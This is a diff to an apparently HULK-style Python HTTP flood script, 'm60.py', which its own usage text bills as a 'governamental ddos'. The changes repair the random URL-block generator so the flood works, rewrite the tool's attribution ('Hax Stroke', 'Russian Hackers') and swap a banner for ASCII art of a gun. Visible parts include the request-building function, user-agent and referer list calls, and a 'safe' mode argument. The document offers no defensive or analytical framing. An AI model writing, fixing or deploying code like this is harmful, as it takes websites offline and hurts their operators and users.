@@ -55,45 +55,38 @@ def referer_list():
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
-		a = random.randint(65, 10)
+		a = random.randint(65, 90)
 		out_str += chr(a)
 	return(out_str)
 
 def usage():
 	print '---------------------------------------------------'
-	print 'USAGE: python3 m60.py <url>'
-	print 'The m60 was one governamental ddos the distribuition of this is limited Created by : Anonymous'
+	print 'USAGE: python m60.py <url>'
+	print 'The m60 was one governamental ddos the distribuition of this is limited Created by : Hax Stroke'
 	print "\a"
 print \
-"""         :hyyyyyyyyyyyyyyyyh+  shyyyyyyyyyyyyyyyyyyyhh`  
-  /d .------------- yo  h+ -----------------`.N`  
-  /d hMMMMMMMMMMMMm yo  h+`MMMMMMMMMMMMMMMMM/.N`  
-  /d hMMMMMMMMMMMMm yo  h+`MMMMMMMMMMMMMMMMM/.N`  
-  /d hMMMMMMMMMMMMm yo  h+`MMMMMMMMMMMMMMMMM/.N`  
-  /d````mMMMMMMN.```yo  ho`.``-hMMMMMMMMy.`.`.N`  
-  -yydy mMMMMMMN`omyy/  +Nm/`oNMMMMMMMd- /dyyss`  
-     oy mMMMMMMN`oy    -do`/mMMMMMMMN+ -ds`       
-     oy mMMMMMMN`oy  `yh..hMMMMMMMMs``yh.         
-     oy mMMMMMMN`oy +d:`sMMMMMMMMh- +d:           
-     oy mMMMMMMN`oddo`/NMMMMMMMm/ :do`            
-     oy mMMMMMMN`oy.-dMMMMMMMMo`.yy.              
-     oy mMMMMMMN```yMMMMMMMMh. od:                
-     oy mMMMMMMN`+NMMMMMMMm: :d+                  
-     oy mMMMMMMMmMMMMMMMMN- .mo                   
-     oy mMMMMMMMMMMMMMMMMMMo``od:                 
-     oy mMMMMMMMMMMMMMMMMMMMm/ .yy.               
-     oy mMMMMMMMMMMNooNMMMMMMMh- :do              
-     oy mMMMMMMMMMy.-..yMMMMMMMMs` +d:            
-     oy mMMMMMMMm:`shho`:mMMMMMMMN+ `yh.          
-     oy mMMMMMMN`:m:  /d/ +NMMMMMMMd- -do`        
-     oy mMMMMMMN`oh    `sh-`yMMMMMMMMy` +d/       
-  :dyho mMMMMMMN`+dyho  sdd+ -dMMMMMMMN+ `syyyh`  
-  /d -::NMMMMMMM/:: os  h+ ::::yMMMMMMMMm/::`-N`  
-  /d hMMMMMMMMMMMMM`os  h+`MMMMMMMMMMMMMMMMM/-N`  
-  /d hMMMMMMMMMMMMM`os  h+`MMMMMMMMMMMMMMMMM/-N`  
-  /d hMMMMMMMMMMMMN`os  h+`MMMMMMMMMMMMMMMMM/-N`  
-  /d................ss  ho...................:N`  
-  -oooooooooooooooooo:  /oooooooooooooooooooooo 
+"""            _________
+            /'        /|
+           /         / |_
+          /         /  //|
+         /_________/  ////|
+        |   _ _    | 8o////|
+        | /'// )_  |   8///|
+        |/ // // ) |   8o///|
+        / // // //,|  /  8//|
+       / // // /// | /   8//|
+      / // // ///__|/    8//|
+     /.(_)// /// |       8///|
+    (_)' `(_)//| |       8////|___________
+   (_) /_\ (_)'| |        8///////////////
+   (_) \"/ (_)'|_|         8/////////////
+    (_)._.(_) d' Hb         8oooooooopb'
+      `(_)'  d'  H`b
+            d'   `b`b
+           d'     H `b
+          d'      `b `b
+         d'           `b
+        d'             `b  
 """
 print '---------------------------------------------------'
 
@@ -102,7 +95,7 @@ print '---------------------------------------------------'
 def httpcall(url):
 	useragent_list()
 	referer_list()
-	code=222
+	code=0
 	if url.count("?")>0:
 		param_joiner="&"
 	else:
@@ -162,7 +155,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "Ak 47 attack was been sended This tool is created by : Anonymous Hackers"
+		print "Ak 47 attack was been sended This tool is created by : Russian Hackers"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
